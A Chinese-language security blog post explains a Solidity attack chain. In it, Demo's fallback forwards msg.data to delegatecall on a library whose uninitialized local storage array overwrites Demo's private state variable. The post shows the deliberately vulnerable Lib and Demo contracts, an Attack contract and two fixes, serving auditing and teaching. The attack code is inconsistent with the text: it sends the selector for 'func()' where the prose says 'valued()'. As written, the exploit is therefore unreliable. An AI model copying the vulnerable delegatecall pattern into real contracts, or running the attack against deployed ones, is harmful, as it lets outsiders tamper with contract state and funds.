---
title: dataLocation和delegatecall攻击链

author: bobby

---
# dataLocation和delegatecall攻击链思考

# 前言

以太坊的智能合约主要使用solidity语言进行开发，在近几年的安全漏洞曝光中，智能合约爆出了大量的安全漏洞。其中有一个漏洞是parity钱包的安全漏洞，漏洞的原因是在回滚函数（fallback）函数里面通过底层调用函数delegatecall函数调用了Lib库里面的函数改变了权限。当然，前提是delegatecall函数的入参可以被调用中控制，例如delegatecall(msg.data)这样的方式。

最近在研究solidity的data location这个知识点，基本上算是分析清楚了solidity的数据存储机制。突然想到有一种攻击方式完全可以利用solidity的数据存储机制和底层调用机制来达到一些修改特殊变量的目的。

当然对于这两个solidity的特性还不熟悉的，可以参考[http://solidity.readthedocs.io/en/v0.4.24/](http://solidity.readthedocs.io/en/v0.4.24/)。

也可以参考下面两个文章：

[以太坊智能合约数据存储.md](./以太坊智能合约数据存储.md)  
[智能合约常见安全漏洞及修复方案.md](./智能合约常见安全漏洞及修复方案.md)

这两篇文章里面分别有对于solidity的数据存储机制和底层调用机制的详细介绍。

# 攻击链分析

好了，我们现在可以来详细的分析这种方式，有如下一段代码：

```

pragma solidity ^0.4.24;

contract Lib {
    
    function valued() public{
        uint256[2] z;
        z[0] = 100;
        z[1] = 200;
    }
    /*
    
    do something
    
    */
    function show(bytes32[] arr){}
}


contract Demo {
    
    uint256 private a=10;
    
    Lib lib;
    
    constructor (address _add){
        lib=Lib(_add);
    }
    
    function (){
        
        // lib.delegatecall(bytes4(keccak256("valued()")));
        lib.delegatecall(msg.data);
    }
    
    function getA() returns(uint256){
        return a;
    }
}


```


上面代码所示，有一个智能合约的Lib库，这个库提供了一些函数供调用，这里为了演示就只写了一个函数valued供其待会演示。

另外一个智能合约通过构造函数引入Lib的地址，然后在fallback函数里面通过底层调用delegatecall的方式来调用Lib里面的函数到本合约里面执行，这里delegatecall的入参数msg.data。

当然Demo里面有一个private 类型的状态变量a值为10。说明这个变量a只能在本智能合约里面使用并且其他合约也是修改不a值的（这个是理论上，如果有其他漏洞一样可以修改。）我们初步看Lib和Demo两个合约的代码，都是没问题的。但是我们仔细看，delegatecall函数的入参为msg.data，说明这里入参是可以被控制的。

那么会想一下，回滚函数怎么才能够被触发的呢。1、通过底层调用Demo一个不存在的函数。2、给Demo直接转以太币，前提是回滚函数是带有payable的关键字。好了，说到这里大家可能已经猜到，我们可以通过底层调用的方式调用Demo一个不存在的函数，同时携带msg.data为bytes4(keccak256("valued()"))的值，这样就会触发回滚函数，然后通过delegatecall调用Lib里面的valued函数到Demo合约里面执行。

因此我们的攻击代码可以这样写：

```

contract Attack{
    Demo d;
    
    constructor(address _add){
        d=Demo(_add);
    }
    
    function att() public{
        d.call(bytes4(keccak256("func()")));
    }
}

```

我们在部署好几个合约以后，通过执行合约Attack里面的att函数，将会把Demo合约里面的私有状态变量a的值改为100。

演示这里暂时就不演示了，大家可以把几个合约部署在remix上面演示看看效果。

# 修复方案

- 可以修改LIb库里面的函数的局部变量uint256[2] z;为uint256[2] memory z;
- 检查delegatecall的入参。


# 后记

对于这种攻击链的方式，主要还是参考了solidity的数据存储机制和底层调用机制来触法的。当然，在实际的攻击中还是需要具体问题具体分析，这里只是提供了一种攻击思路或者说说源代码审计思路。
















